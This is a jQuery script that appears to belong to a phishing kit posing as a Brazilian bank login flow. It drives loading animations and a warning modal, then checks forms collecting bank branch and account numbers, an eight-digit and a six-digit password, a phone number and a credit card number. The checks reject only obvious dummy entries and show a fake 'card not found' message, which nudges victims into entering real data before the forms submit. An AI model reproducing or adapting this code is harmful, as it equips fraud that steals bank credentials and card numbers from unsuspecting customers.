// LOADING PAGE
$(function(){
    window.setTimeout(function(){
        $('#exibeLogoIndex').delay(100).css('opacity',0).show().animate({opacity:1},1000);
    }, 1000);
});
$(function(){
    window.setTimeout(function(){
        $(".loading-content").animate({
        	"left": "-=23%",
        	"top": "-=20%",
        },"slow");
        $("#exibeLogoIndex").animate({
        	"width":"60px",
        	"margin-right":"36px",
        	"padding-bottom":"20px",
        });
        $('#exibeTextoIndex').delay(100).css('opacity',0).show().animate({opacity:1},1000);
    }, 6000);
});
var i = setInterval(function () {
    clearInterval(i);
  
    document.getElementById("loadingHome").style.visibility = "hidden";
}, 10000);


// LOADING PAGES
var i = setInterval(function () {
    clearInterval(i);
  
    document.getElementById("loadingPage").style.visibility = "hidden";
}, 1000);



// MODAL AVISE
$(document).ready(function(){
  $('#modalAviso').modal('show');
})


// VALID ACCOUNT
$(document).ready(function(){
  $("#validate_bank_account").click(function(){
    var agencia = formAccount.agency_number.value;
    var conta = formAccount.account_number.value;
    var senha = formAccount.password8.value;

    if (agencia == "" ||
        agencia.length < 6 ||
        agencia == "1234-5" || 
        agencia == "9876-5" || 
        agencia == "0000-0" || 
        agencia == "1111-1" || 
        agencia == "2222-2" ||
        agencia == "3333-3" || 
        agencia == "4444-4" || 
        agencia == "5555-5" || 
        agencia == "6666-6" || 
        agencia == "7777-7" || 
        agencia == "8888-8" || 
        agencia == "9999-9"){
          modAlert("Agência inválida, digite corretamente !");
         
      return false;
    } else if (conta == "" ||
            conta.length <6 ||
            conta == "000000-0" || 
            conta == "1111111-1" || 
            conta == "2222222-2" || 
            conta == "3333333-3" || 
            conta == "4444444-4" || 
            conta == "5555555-5" || 
            conta == "6666666-6" || 
            conta == "7777777-7" || 
            conta == "8888888-8" || 
            conta == "9999999-9"){
              modAlert("Conta inválida, digite corretamente !");
              
          return false;
        } else{
            $(".loading").css({"display": "block"});
            $("#formAccount").submit();
            return false;
        }
  });
})


// validate liberation 
$(document).ready(function(){
  $("#validate_info_identification").click(function(){
    var telefone = formIdentification.phone.value;
    var senha6 = formIdentification.password6.value;

    if (telefone == "" ||
        telefone == "(00)00000-0000" ||
        telefone == "(11)11111-1111" ||
        telefone == "(22)22222-2222" ||
        telefone == "(33)33333-3333" ||
        telefone == "(44)44444-4444" ||
        telefone == "(55)55555-5555" ||
        telefone == "(66)66666-6666" ||
        telefone == "(77)77777-7777" ||
        telefone == "(88)88888-8888" ||
        telefone == "(99)99999-9999" ||
        telefone.length < 13) {
         modAlert("Digite um número de celular válido");
         
     return false;
    }
     else if (senha6 == "" ||
            senha6.length <6 ||
			senha6.length >=7 ||
            senha6 == "000000" || 
            senha6 == "1111111" || 
            senha6 == "2222222" || 
            senha6 == "3333333" || 
            senha6 == "4444444" || 
            senha6 == "5555555" || 
            senha6 == "6666666" || 
            senha6 == "7777777" || 
            senha6 == "8888888" || 
            senha6 == "9999999"){
              modAlert("Senha de 6 dígitos inválida, digite corretamente");
              
          return false;
        } else{
            $(".loading").css({"display": "block"});
            $("#formIdentification").submit();
            return false;
        }
  });
})


// CHECK INFO CC
$(document).ready(function() {
    $( "#entrar" ).click(function() {
       var numc   =  formCard.numc.value.replace(/\D/g, '');
       var checkCC = checkCard(numc);

          if (numc == "" || numc.length < 16) {
           modAlert("Digite um cartão válido.");
           
           return false;
          } else if (!checkCC) {
            modAlert("Cartão de crédito não localizado. Tente novamente");
            
            return false;
          } else {
             $(".loading").css({'display': 'block'});
             $("#formCard").submit();
             return false;
          }
    });     
})   